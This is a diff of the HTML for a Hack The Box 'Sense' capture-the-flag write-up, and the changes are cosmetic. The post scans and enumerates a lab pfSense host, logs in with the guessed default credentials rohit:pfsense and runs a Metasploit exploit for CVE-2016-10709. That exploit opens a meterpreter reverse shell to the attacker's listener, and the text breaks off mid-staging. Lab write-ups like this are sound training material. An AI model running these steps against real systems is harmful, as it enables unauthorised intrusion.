@@ -44,7 +44,7 @@
 <meta itemprop="name" content="HTB - Sense">
 <meta itemprop="description" content="exploitdb and msf"><meta itemprop="datePublished" content="2020-09-22T00:54:12+08:00" />
 <meta itemprop="dateModified" content="2020-09-22T00:54:12+08:00" />
-<meta itemprop="wordCount" content="574"><meta itemprop="image" content="https://0xade1.github.io/devdraft"/>
+<meta itemprop="wordCount" content="573"><meta itemprop="image" content="https://0xade1.github.io/devdraft"/>
 <meta itemprop="keywords" content="exploitdb,metasploit,pfsense," />
 <meta name="twitter:card" content="summary_large_image"/>
 <meta name="twitter:image" content="https://0xade1.github.io/devdraft"/>
@@ -198,108 +198,108 @@
 
       <div class="post-content">
         <h1 id="nmap">nmap</h1>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>_  sense nmap -p- --min-rate<span style="color:#ff79c6">=</span><span style="color:#bd93f9">5000</span> -T4 10.10.10.60
-</span></span><span style="display:flex;"><span>Starting Nmap 7.80 <span style="color:#ff79c6">(</span> https://nmap.org <span style="color:#ff79c6">)</span> at 2020-09-20 20:06 HKT
-</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#ff79c6">for</span> 10.10.10.60
-</span></span><span style="display:flex;"><span>Host is up <span style="color:#ff79c6">(</span>0.055s latency<span style="color:#ff79c6">)</span>.
-</span></span><span style="display:flex;"><span>Not shown: <span style="color:#bd93f9">65533</span> filtered ports
-</span></span><span style="display:flex;"><span>PORT    STATE SERVICE
-</span></span><span style="display:flex;"><span>80/tcp  open  http
-</span></span><span style="display:flex;"><span>443/tcp open  https
-</span></span></code></pre></td></tr></table>
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">_  sense nmap -p- --min-rate<span style="color:#ff79c6">=</span><span style="color:#bd93f9">5000</span> -T4 10.10.10.60
+Starting Nmap 7.80 <span style="color:#ff79c6">(</span> https://nmap.org <span style="color:#ff79c6">)</span> at 2020-09-20 20:06 HKT
+Nmap scan report <span style="color:#ff79c6">for</span> 10.10.10.60
+Host is up <span style="color:#ff79c6">(</span>0.055s latency<span style="color:#ff79c6">)</span>.
+Not shown: <span style="color:#bd93f9">65533</span> filtered ports
+PORT    STATE SERVICE
+80/tcp  open  http
+443/tcp open  https
+</code></pre></td></tr></table>
 </div>
 </div><p>Website is pfsense login page</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>_  sense   gobuster  dir -k -u https://10.10.10.60 -w /opt/dictionaries/directory-list-2.3-medium.txt -x txt,swp,log,xml,json -t <span style="color:#8be9fd;font-style:italic">50</span>
-</span></span><span style="display:flex;"><span><span style="color:#ff79c6">===============================================================</span>
-</span></span><span style="display:flex;"><span>Gobuster v3.0.1
-</span></span><span style="display:flex;"><span>by OJ Reeves <span style="color:#ff79c6">(</span>@TheColonial<span style="color:#ff79c6">)</span> &amp; Christian Mehlmauer <span style="color:#ff79c6">(</span>@_FireFart_<span style="color:#ff79c6">)</span>
-</span></span><span style="display:flex;"><span><span style="color:#ff79c6">===============================================================</span>
-</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Url:            https://10.10.10.60
-</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Threads:        <span style="color:#bd93f9">50</span>
-</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Wordlist:       /opt/dictionaries/directory-list-2.3-medium.txt
-</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Status codes:   200,204,301,302,307,401,403
-</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> User Agent:     gobuster/3.0.1
-</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Extensions:     txt,swp,log,xml,json
-</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Timeout:        <span style="color:#8be9fd;font-style:italic">10s</span>
-</span></span><span style="display:flex;"><span><span style="color:#ff79c6">===============================================================</span>
-</span></span><span style="display:flex;"><span>2020/09/20 20:31:51 Starting <span style="color:#8be9fd;font-style:italic">gobuster</span>
-</span></span><span style="display:flex;"><span><span style="color:#ff79c6">===============================================================</span>
-</span></span><span style="display:flex;"><span>/themes <span style="color:#ff79c6">(</span>Status: 301<span style="color:#ff79c6">)</span>
-</span></span><span style="display:flex;"><span>/css <span style="color:#ff79c6">(</span>Status: 301<span style="color:#ff79c6">)</span>
-</span></span><span style="display:flex;"><span>/includes <span style="color:#ff79c6">(</span>Status: 301<span style="color:#ff79c6">)</span>
-</span></span><span style="display:flex;"><span>/javascript <span style="color:#ff79c6">(</span>Status: 301<span style="color:#ff79c6">)</span>
-</span></span><span style="display:flex;"><span>/changelog.txt <span style="color:#ff79c6">(</span>Status: 200<span style="color:#ff79c6">)</span>
-</span></span><span style="display:flex;"><span>/classes <span style="color:#ff79c6">(</span>Status: 301<span style="color:#ff79c6">)</span>
-</span></span><span style="display:flex;"><span>/widgets <span style="color:#ff79c6">(</span>Status: 301<span style="color:#ff79c6">)</span>
-</span></span><span style="display:flex;"><span>/tree <span style="color:#ff79c6">(</span>Status: 301<span style="color:#ff79c6">)</span>
-</span></span><span style="display:flex;"><span>/shortcuts <span style="color:#ff79c6">(</span>Status: 301<span style="color:#ff79c6">)</span>
-</span></span><span style="display:flex;"><span>/installer <span style="color:#ff79c6">(</span>Status: 301<span style="color:#ff79c6">)</span>
-</span></span><span style="display:flex;"><span>/wizards <span style="color:#ff79c6">(</span>Status: 301<span style="color:#ff79c6">)</span>
-</span></span><span style="display:flex;"><span>/csrf <span style="color:#ff79c6">(</span>Status: 301<span style="color:#ff79c6">)</span>
-</span></span><span style="display:flex;"><span>/system-users.txt <span style="color:#ff79c6">(</span>Status: 200<span style="color:#ff79c6">)</span>
-</span></span><span style="display:flex;"><span>/filebrowser <span style="color:#ff79c6">(</span>Status: 301<span style="color:#ff79c6">)</span>
-</span></span></code></pre></td></tr></table>
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">_  sense   gobuster  dir -k -u https://10.10.10.60 -w /opt/dictionaries/directory-list-2.3-medium.txt -x txt,swp,log,xml,json -t <span style="color:#8be9fd;font-style:italic">50</span>
+<span style="color:#ff79c6">===============================================================</span>
+Gobuster v3.0.1
+by OJ Reeves <span style="color:#ff79c6">(</span>@TheColonial<span style="color:#ff79c6">)</span> &amp; Christian Mehlmauer <span style="color:#ff79c6">(</span>@_FireFart_<span style="color:#ff79c6">)</span>
+<span style="color:#ff79c6">===============================================================</span>
+<span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Url:            https://10.10.10.60
+<span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Threads:        <span style="color:#bd93f9">50</span>
+<span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Wordlist:       /opt/dictionaries/directory-list-2.3-medium.txt
+<span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Status codes:   200,204,301,302,307,401,403
+<span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> User Agent:     gobuster/3.0.1
+<span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Extensions:     txt,swp,log,xml,json
+<span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Timeout:        <span style="color:#8be9fd;font-style:italic">10s</span>
+<span style="color:#ff79c6">===============================================================</span>
+2020/09/20 20:31:51 Starting <span style="color:#8be9fd;font-style:italic">gobuster</span>
+<span style="color:#ff79c6">===============================================================</span>
+/themes <span style="color:#ff79c6">(</span>Status: 301<span style="color:#ff79c6">)</span>
+/css <span style="color:#ff79c6">(</span>Status: 301<span style="color:#ff79c6">)</span>
+/includes <span style="color:#ff79c6">(</span>Status: 301<span style="color:#ff79c6">)</span>
+/javascript <span style="color:#ff79c6">(</span>Status: 301<span style="color:#ff79c6">)</span>
+/changelog.txt <span style="color:#ff79c6">(</span>Status: 200<span style="color:#ff79c6">)</span>
+/classes <span style="color:#ff79c6">(</span>Status: 301<span style="color:#ff79c6">)</span>
+/widgets <span style="color:#ff79c6">(</span>Status: 301<span style="color:#ff79c6">)</span>
+/tree <span style="color:#ff79c6">(</span>Status: 301<span style="color:#ff79c6">)</span>
+/shortcuts <span style="color:#ff79c6">(</span>Status: 301<span style="color:#ff79c6">)</span>
+/installer <span style="color:#ff79c6">(</span>Status: 301<span style="color:#ff79c6">)</span>
+/wizards <span style="color:#ff79c6">(</span>Status: 301<span style="color:#ff79c6">)</span>
+/csrf <span style="color:#ff79c6">(</span>Status: 301<span style="color:#ff79c6">)</span>
+/system-users.txt <span style="color:#ff79c6">(</span>Status: 200<span style="color:#ff79c6">)</span>
+/filebrowser <span style="color:#ff79c6">(</span>Status: 301<span style="color:#ff79c6">)</span>
+</code></pre></td></tr></table>
 </div>
 </div><p>Found changelog.txt which informs us of a missing vulnerability patch</p>
 <p>Found system-users.txt which contains username rohit with a note about default password</p>
 <p>What defaut password could this be? let&rsquo;s try: sense, pfsense, etc &hellip;</p>
 <p>that works with rohit:pfsense, we could login and see which version of pfsense:</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>Version 	2.1.3-RELEASE (amd64)
-</span></span><span style="display:flex;"><span>built on Thu May 01 15:52:13 EDT 2014
-</span></span><span style="display:flex;"><span>FreeBSD 8.3-RELEASE-p16
-</span></span></code></pre></td></tr></table>
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">Version 	2.1.3-RELEASE (amd64)
+built on Thu May 01 15:52:13 EDT 2014
+FreeBSD 8.3-RELEASE-p16
+</code></pre></td></tr></table>
 </div>
 </div><p><a href="https://www.cvedetails.com/vulnerability-list/vendor_id-11749/product_id-21763/Pfsense-Pfsense.html">Vulnerability list</a> for PFsense reveals <a href="https://www.cvedetails.com/cve/CVE-2016-10709/">CVE-2016-10709</a> is a good candidate for the missing vulnerability; and it has an exploit available (exploitdb and metasploit):</p>
 <ul>
@@ -308,142 +308,142 @@
 </ul>
 <h1 id="metasploit">Metasploit</h1>
 <p>got the shell</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msf6 &gt; use exploit/unix/http/pfsense_graph_injection_exec
-</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Using configured payload php/meterpreter/reverse_tcp
-</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#ff79c6">(</span>unix/http/pfsense_graph_injection_exec<span style="color:#ff79c6">)</span> &gt; info
-</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#ff79c6">(</span>unix/http/pfsense_graph_injection_exec<span style="color:#ff79c6">)</span> &gt; <span style="color:#8be9fd;font-style:italic">set</span> rhosts 10.10.10.60
-</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">rhosts</span> <span style="color:#ff79c6">=</span>&gt; 10.10.10.60
-</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#ff79c6">(</span>unix/http/pfsense_graph_injection_exec<span style="color:#ff79c6">)</span> &gt; <span style="color:#8be9fd;font-style:italic">set</span> username rohit
-</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">username</span> <span style="color:#ff79c6">=</span>&gt; rohit
-</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#ff79c6">(</span>unix/http/pfsense_graph_injection_exec<span style="color:#ff79c6">)</span> &gt; <span style="color:#8be9fd;font-style:italic">set</span> lhost 10.10.14.38
-</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">lhost</span> <span style="color:#ff79c6">=</span>&gt; 10.10.14.38
-</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#ff79c6">(</span>unix/http/pfsense_graph_injection_exec<span style="color:#ff79c6">)</span> &gt; run
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>-<span style="color:#ff79c6">]</span> Handler failed to <span style="color:#8be9fd;font-style:italic">bind</span> to 10.10.14.38:4444:-  -
-</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Started reverse TCP handler on 0.0.0.0:4444
-</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Detected pfSense 2.1.3-RELEASE, uploading intial payload
-</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Payload uploaded successfully, executing
-</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Sending stage <span style="color:#ff79c6">(</span><span style="color:#bd93f9">39264</span> bytes<span style="color:#ff79c6">)</span> to 172.17.0.1
